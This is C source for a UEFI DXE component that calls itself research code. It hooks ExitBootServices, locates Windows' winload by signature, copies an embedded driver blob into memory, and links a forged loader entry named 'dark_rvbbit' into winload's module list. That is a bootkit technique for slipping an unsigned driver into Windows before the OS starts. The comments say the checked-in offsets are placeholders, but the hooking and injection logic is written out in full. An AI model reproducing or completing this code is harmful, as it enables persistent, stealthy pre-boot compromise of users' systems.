// UEFI DXE research component. The code inspects loaded images and
// references offsets supplied in winload_offsets.h.
// The checked-in offsets are placeholders; this is not a complete loader.

#include <Uefi.h>
#include <Library/UefiBootServicesTableLib.h>
#include <Library/MemoryAllocationLib.h>
#include <Library/BaseMemoryLib.h>
#include <Library/DebugLib.h>
#include <Protocol/LoadedImage.h>
#include "../driver/winload_offsets.h"

STATIC EFI_EXIT_BOOT_SERVICES gOrigExitBootServices = NULL;

extern CONST UINT8 gHvDriverBlob[];
extern CONST UINTN gHvDriverSize;

STATIC BOOLEAN IsPeImage(VOID *Base) {
    UINT8 *p = (UINT8*)Base;
    if (p[0] != 'M' || p[1] != 'Z') return FALSE;
    UINT32 e_lfanew = *(UINT32*)(p + 0x3C);
    if (e_lfanew > 0x400) return FALSE;
    if (*(UINT32*)(p + e_lfanew) != 0x00004550) return FALSE;
    return TRUE;
}

STATIC BOOLEAN IsWinload(VOID *Base, UINTN Size) {
    UINT8 *p = (UINT8*)Base;
    for (UINTN off = 0; off + 8 < Size; off += 4) {
        UINT32 w = *(UINT32*)(p + off);
        if (w == 0x6C736C4F) {          // "Osl"
            UINT32 w2 = *(UINT32*)(p + off + 4);
            if (w2 == 0x64616F4C) return TRUE;   // "Load"
        }
    }
    return FALSE;
}

// build a minimal LDR_DATA_TABLE_ENTRY in slack and link at tail of list.
STATIC BOOLEAN InjectEntry(VOID *ImageBase, UINTN ImageSize,
                           UINT8 *SlackStart, UINTN SlackSize,
                           UINT64 DriverBase, UINT64 DriverSize) {
    if (SlackSize < 0x100) return FALSE;

    UINT8 *listHead = (UINT8*)ImageBase + WL_LIST_HEAD_RVA;

    UINT8 *entry = SlackStart;
    ZeroMem(entry, 0x80);

    UINT64 *dllBase  = (UINT64*)(entry + WL_LDR_DLLBASE_OFF);
    UINT32 *imgSize  = (UINT32*)(entry + WL_LDR_SIZEOFIMAGE_OFF);

    *dllBase = DriverBase;
    *imgSize = (UINT32)DriverSize;

    WCHAR *name = (WCHAR*)(entry + 0x80);
    const CHAR8 *ascii = "dark_rvbbit";
    for (int i = 0; i < 11; i++) name[i] = (WCHAR)ascii[i];
    name[11] = 0;

    UINT16 *usLen = (UINT16*)(entry + 0x58);
    UINT16 *usMax = (UINT16*)(entry + 0x5A);
    UINT64 *usBuf = (UINT64*)(entry + 0x60);
    *usLen = 22;
    *usMax = 32;
    *usBuf = (UINT64)name;

    UINT64 *headF = (UINT64*)listHead;
    UINT64 *headB = (UINT64*)(listHead + 8);
    UINT64 tail = *headB;

    UINT64 *entryF = (UINT64*)(entry + 0);
    UINT64 *entryB = (UINT64*)(entry + 8);
    *entryF = (UINT64)listHead;
    *entryB = tail;

    *(UINT64*)(tail + 0) = (UINT64)entry;
    *headB = (UINT64)entry;

    UNREFERENCED_PARAMETER(ImageSize);
    UNREFERENCED_PARAMETER(headF);
    return TRUE;
}

STATIC EFI_STATUS
EFIAPI
HookedExitBootServices(EFI_HANDLE ImageHandle, UINTN MapKey) {
    UINTN handleCount = 0;
    EFI_HANDLE *handles = NULL;
    EFI_STATUS st = gBS->LocateHandleBuffer(ByProtocol, &gEfiLoadedImageProtocolGuid,
                                            NULL, &handleCount, &handles);

    if (!EFI_ERROR(st) && handles) {
        for (UINTN i = 0; i < handleCount; i++) {
            EFI_LOADED_IMAGE_PROTOCOL *li = NULL;
            if (EFI_ERROR(gBS->HandleProtocol(handles[i], &gEfiLoadedImageProtocolGuid, (VOID**)&li))) continue;
            if (!li || !li->ImageBase || li->ImageSize < 0x1000) continue;
            if (!IsPeImage(li->ImageBase)) continue;
            if (!IsWinload(li->ImageBase, li->ImageSize)) continue;

            // The placeholder offset disables this experimental path.
            if (WL_LIST_HEAD_RVA == 0) continue;
            if (WL_LIST_HEAD_RVA >= li->ImageSize) continue;

            UINT8 *slackStart = (UINT8*)li->ImageBase + li->ImageSize - 0x200;
            UINTN  slackSize  = 0x200;

            UINTN pages = (gHvDriverSize + EFI_PAGE_SIZE - 1) / EFI_PAGE_SIZE;
            EFI_PHYSICAL_ADDRESS blobPhys = 0xFFFFFFFF;
            st = gBS->AllocatePages(AllocateMaxAddress, EfiLoaderData, pages, &blobPhys);
            if (EFI_ERROR(st)) break;
            CopyMem((VOID*)(UINTN)blobPhys, gHvDriverBlob, gHvDriverSize);

            if (!InjectEntry(li->ImageBase, li->ImageSize,
                             slackStart, slackSize, blobPhys, gHvDriverSize)) {
                gBS->FreePages(blobPhys, pages);
                break;
            }
            break;
        }
        if (handles) FreePool(handles);
    }

    return gOrigExitBootServices(ImageHandle, MapKey);
}

EFI_STATUS
EFIAPI
UefiMain(EFI_HANDLE ImageHandle, EFI_SYSTEM_TABLE *SystemTable) {
    gOrigExitBootServices = gBS->ExitBootServices;
    gBS->ExitBootServices = HookedExitBootServices;
    return EFI_SUCCESS;
}